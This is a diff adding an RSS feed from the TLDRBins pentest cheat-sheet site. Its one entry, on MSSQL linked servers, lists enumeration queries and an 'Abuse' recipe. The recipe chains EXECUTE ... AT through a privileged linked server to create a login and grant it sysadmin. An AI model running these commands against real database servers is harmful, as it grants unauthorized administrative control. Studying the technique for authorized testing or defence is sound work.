@@ -1,0 +1,18 @@
+<?xml version="1.0" encoding="utf-8" standalone="yes"?>
+<rss version="2.0" xmlns:atom="http://www.w3.org/2005/Atom">
+  <channel>
+    <title>Linked_server on TLDRBins</title>
+    <link>https://tldrbins.github.io/@linked_server/</link>
+    <description>Recent content in Linked_server on TLDRBins</description>
+    <generator>Hugo</generator>
+    <language>en-us</language>
+    <atom:link href="https://tldrbins.github.io/@linked_server/index.xml" rel="self" type="application/rss+xml" />
+    <item>
+      <title>MSSQL Linked Servers</title>
+      <link>https://tldrbins.github.io/mssql_linked_server/</link>
+      <pubDate>Mon, 01 Jan 0001 00:00:00 +0000</pubDate>
+      <guid>https://tldrbins.github.io/mssql_linked_server/</guid>
+      <description> Linked Servers Basic Commands Hint: Use double &#39;&#39; to escape &#39; in mssql&#xA;# Show current server select @@servername # Show linked servers select srvname from sysservers; Execute Query between Linked Servers # Execute query from current server to linked server EXECUTE (&amp;#39;select @@version;&amp;#39;) at [&amp;lt;LINKED_SERVER&amp;gt;]; # Execute query from linked server to current server EXECUTE (&amp;#39;EXECUTE (&amp;#39;&amp;#39;SELECT entity_name, permission_name FROM fn_my_permissions(NULL, &amp;#39;&amp;#39;&amp;#39;&amp;#39;SERVER&amp;#39;&amp;#39;&amp;#39;&amp;#39;);&amp;#39;&amp;#39;) at [&amp;lt;CURRENT_SERVER&amp;gt;]&amp;#39;) at [&amp;lt;LINKED_SERVER&amp;gt;]; Abuse #1: Create Admin User from Privilege Linked Server EXECUTE(&amp;#39;EXECUTE(&amp;#39;&amp;#39;CREATE LOGIN &amp;lt;USER&amp;gt; WITH PASSWORD = &amp;#39;&amp;#39;&amp;#39;&amp;#39;&amp;lt;PASSWORD&amp;gt;&amp;#39;&amp;#39;&amp;#39;&amp;#39;;&amp;#39;&amp;#39;) AT [&amp;lt;CURRENT_SERVER&amp;gt;]&amp;#39;) AT [&amp;lt;LINKED_SERVER&amp;gt;] EXECUTE(&amp;#39;EXECUTE(&amp;#39;&amp;#39;EXEC sp_addsrvrolemember &amp;#39;&amp;#39;&amp;#39;&amp;#39;&amp;lt;USER&amp;gt;&amp;#39;&amp;#39;&amp;#39;&amp;#39;, &amp;#39;&amp;#39;&amp;#39;&amp;#39;sysadmin&amp;#39;&amp;#39;&amp;#39;&amp;#39;&amp;#39;&amp;#39;) AT [&amp;lt;CURRENT_SERVER&amp;gt;]&amp;#39;) AT [&amp;lt;LINKED_SERVER&amp;gt;] </description>
+    </item>
+  </channel>
+</rss>
